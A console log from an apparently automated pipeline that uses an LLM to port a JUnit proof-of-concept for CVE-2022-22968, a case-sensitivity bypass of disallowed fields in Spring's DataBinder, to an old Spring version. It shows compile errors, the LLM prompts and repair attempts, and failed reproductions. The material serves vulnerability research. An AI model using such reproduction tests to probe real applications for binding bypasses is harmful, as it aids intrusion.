  required: java.lang.String[]
  found: java.lang.String,java.lang.String
  reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[17,36] incompatible types: java.lang.String cannot be converted to java.lang.String[]
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol
  symbol:   method add(java.lang.String,java.lang.String)
  location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol
  symbol:   method add(java.lang.String,int)
  location: variable pvs of type org.springframework.beans.MutablePropertyValues
[INFO] 4 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.834 s
[INFO] Finished at: 2025-07-11T03:19:17Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-22968: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[16,15] method setAllowedFields in class org.springframework.validation.DataBinder cannot be applied to given types;
[ERROR]   required: java.lang.String[]
[ERROR]   found: java.lang.String,java.lang.String
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[17,36] incompatible types: java.lang.String cannot be converted to java.lang.String[]
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol
[ERROR]   symbol:   method add(java.lang.String,java.lang.String)
[ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol
[ERROR]   symbol:   method add(java.lang.String,int)
[ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


[92m[RepairModule] Error method setAllowedFields in class org.springframework.validation.DataBinder cannot be applied to given types; required: java.lang.String[] found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.6.SEC03...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-22968: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[17,36] incompatible types: java.lang.String cannot be converted to java.lang.String[][0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method add(java.lang.String,java.lang.String)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method add(java.lang.String,int)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1777 (prompt), 1 (completion), 1778 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 2.5.6.SEC03:org.springframework:spring-context.
This test file compiles and runs successfully with version 3.0.0.RELEASE.

Your task is to:
1. Analyze why this issue occurs with the *3.0.0.RELEASE* but not with the *2.5.6.SEC03 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-22968 >--------------------
[INFO] Building CVE-2022-22968 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-22968 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-22968 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-22968 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-22968 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-22968 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 2 source files to /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[WARNING] COMPILATION WARNING : 
[INFO] -------------------------------------------------------------
[WARNING] Some messages have been simplified; recompile with -Xdiags:verbose to get full output
[INFO] 1 warning
[INFO] -------------------------------------------------------------
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[17,36] incompatible types: java.lang.String cannot be converted to java.lang.String[]
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol
  symbol:   method add(java.lang.String,java.lang.String)
  location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol
  symbol:   method add(java.lang.String,int)
  location: variable pvs of type org.springframework.beans.MutablePropertyValues
[INFO] 3 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.895 s
[INFO] Finished at: 2025-07-11T03:19:47Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-22968: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[17,36] incompatible types: java.lang.String cannot be converted to java.lang.String[]
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol
[ERROR]   symbol:   method add(java.lang.String,java.lang.String)
[ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol
[ERROR]   symbol:   method add(java.lang.String,int)
[ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>edu.vision.se</groupId>
  <artifactId>CVE-2022-22968</artifactId>
  <version>1.0-SNAPSHOT</version>
  <properties>
    <maven.compiler.target>11</maven.compiler.target>
    <maven.compiler.source>11</maven.compiler.source>
  </properties>
  <dependencies>
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-context</artifactId>
      <version>2.5.6.SEC03</version>
    </dependency>
  <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
  
  </dependencies>
</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 143 (prompt), 8 (completion), 151 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 2.5.6.SEC03: 

Error: incompatible types: java.lang.String cannot be converted to java.lang.String[], None, None 

The test executes as expected in 3.0.0.RELEASE 

Error code:         binder.setDisallowedFields("AGE"); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
binder.setDisallowedFields;AGE
[96m[ErrorManager] Extracted key entities: ['binder.setDisallowedFields', 'AGE'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 17, 'column': 36, 'message': 'incompatible types: java.lang.String cannot be converted to java.lang.String[]', 'symbol': None, 'location': None, 'code_line': '        binder.setDisallowedFields("AGE");'} with cause: ['binder.setDisallowedFields', 'AGE'][0m
[96m[Adapter] Related diffs for error: [][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: incompatible types: java.lang.String cannot be converted to java.lang.String[] | cause: ['binder.setDisallowedFields', 'AGE'][0m
[96m[RepairModule] Trying best diff #None with score 0.00[0m
[93m[RepairModule] Diff #None content empty[0m
[LLMClient] Tokens used: 491 (prompt), 291 (completion), 782 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 2.5.6.SEC03:org.springframework:spring-context.
This test file compiles and runs successfully in 3.0.0.RELEASE.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.0.0.RELEASE to 2.5.6.SEC03.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: incompatible types: java.lang.String cannot be converted to java.lang.String[], symble: None, location: None

### Error Position:
        binder.setDisallowedFields("AGE");

### Related Diff:


### Test File Content:
package edu.vision.se;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

import org.junit.Test;
import org.springframework.beans.MutablePropertyValues;
import org.springframework.validation.BindException;
import org.springframework.validation.DataBinder;

public class Testcase1 {
    @Test
    public void bindingWithAllowedAndDisallowedFields() throws BindException {
        TestBean rod = new TestBean();
        DataBinder binder = new DataBinder(rod);
        binder.setAllowedFields(new String[] {"name", "age"});
        binder.setDisallowedFields("AGE");
        MutablePropertyValues pvs = new MutablePropertyValues();
        pvs.add("name", "Rod");
        pvs.add("age", 32);

        binder.bind(pvs);
        binder.close();

        assertEquals("changed name correctly", "Rod", rod.getName());
        assertEquals("did not change age", 0, rod.getAge());

        String[] suppressedFields = binder.getBindingResult().getSuppressedFields();
        boolean containsField = false;
        for (String actualField : suppressedFields) {
            if ("age".equals(actualField)) {
                containsField = true;
                break;
            }
        }
        assertTrue("not found: " + "age", containsField);

    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

import org.junit.Test;
import org.springframework.beans.MutablePropertyValues;
import org.springframework.validation.BindException;
import org.springframework.validation.DataBinder;

public class Testcase1 {
    @Test
    public void bindingWithAllowedAndDisallowedFields() throws BindException {
        TestBean rod = new TestBean();
        DataBinder binder = new DataBinder(rod);
        binder.setAllowedFields(new String[] {"name", "age"});
        binder.setDisallowedFields(new String[] {"AGE"});
        MutablePropertyValues pvs = new MutablePropertyValues();
        pvs.add("name", "Rod");
        pvs.add("age", 32);

        binder.bind(pvs);
        binder.close();

        assertEquals("changed name correctly", "Rod", rod.getName());
        assertEquals("did not change age", 0, rod.getAge());

        String[] suppressedFields = binder.getBindingResult().getSuppressedFields();
        boolean containsField = false;
        for (String actualField : suppressedFields) {
            if ("age".equals(actualField)) {
                containsField = true;
                break;
            }
        }
        assertTrue("not found: " + "age", containsField);

    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.6.SEC03...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-22968: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method add(java.lang.String,java.lang.String)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method add(java.lang.String,int)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'cannot find symbol | method add(java.lang.String,java.lang.String)', 'incompatible types: java.lang.String cannot be converted to java.lang.String[] |', 'cannot find symbol | method add(java.lang.String,int)'}
[RepairModule] New grouped keys: {'cannot find symbol | method add(java.lang.String,java.lang.String)', 'cannot find symbol | method add(java.lang.String,int)'}
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-22968 >--------------------
[INFO] Building CVE-2022-22968 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-22968 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-22968 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-22968 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-22968 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-22968 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 2 source files to /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol
  symbol:   method add(java.lang.String,java.lang.String)
  location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol
  symbol:   method add(java.lang.String,int)
  location: variable pvs of type org.springframework.beans.MutablePropertyValues
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.965 s
[INFO] Finished at: 2025-07-11T03:20:16Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-22968: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol
[ERROR]   symbol:   method add(java.lang.String,java.lang.String)
[ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol
[ERROR]   symbol:   method add(java.lang.String,int)
[ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-22968 >--------------------
[INFO] Building CVE-2022-22968 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-22968 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-22968 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-22968 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-22968 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-22968 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 2 source files to /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[WARNING] COMPILATION WARNING : 
[INFO] -------------------------------------------------------------
[WARNING] Some messages have been simplified; recompile with -Xdiags:verbose to get full output
[INFO] 1 warning
[INFO] -------------------------------------------------------------
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[17,36] incompatible types: java.lang.String cannot be converted to java.lang.String[]
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol
  symbol:   method add(java.lang.String,java.lang.String)
  location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol
  symbol:   method add(java.lang.String,int)
  location: variable pvs of type org.springframework.beans.MutablePropertyValues
[INFO] 3 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.895 s
[INFO] Finished at: 2025-07-11T03:19:47Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-22968: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[17,36] incompatible types: java.lang.String cannot be converted to java.lang.String[]
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol
[ERROR]   symbol:   method add(java.lang.String,java.lang.String)
[ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol
[ERROR]   symbol:   method add(java.lang.String,int)
[ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


[92m[RepairModule] Error incompatible types: java.lang.String cannot be converted to java.lang.String[] resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.6.SEC03...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-22968: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method add(java.lang.String,java.lang.String)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method add(java.lang.String,int)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1587 (prompt), 1 (completion), 1588 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 2.5.6.SEC03:org.springframework:spring-context.
This test file compiles and runs successfully with version 3.0.0.RELEASE.

Your task is to:
1. Analyze why this issue occurs with the *3.0.0.RELEASE* but not with the *2.5.6.SEC03 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-22968 >--------------------
[INFO] Building CVE-2022-22968 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-22968 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-22968 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-22968 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-22968 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-22968 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 2 source files to /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol
  symbol:   method add(java.lang.String,java.lang.String)
  location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol
  symbol:   method add(java.lang.String,int)
